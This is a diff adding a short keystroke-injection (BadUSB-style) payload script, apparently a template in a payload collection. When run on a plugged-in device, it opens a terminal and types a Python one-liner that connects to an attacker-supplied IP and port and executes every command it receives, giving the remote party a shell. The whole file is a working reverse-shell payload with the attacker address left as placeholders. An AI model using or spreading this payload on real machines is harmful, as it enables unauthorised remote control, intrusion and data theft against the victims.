@@ -1,0 +1,6 @@
+REM Creates and executes a reverse shell in python
+DELAY {start_delay}
+CTRL-ALT t
+DELAY 400
+STRING python -c "exec('import socket as s\nfrom subprocess import getoutput as g\nc=s.socket(s.AF_INET,s.SOCK_STREAM)\nc.connect((\'{ip}\',{port}))\nwhile 1:c.send(g(c.recv(9999).decode()).encode())')"{close_bash}
+ENTER
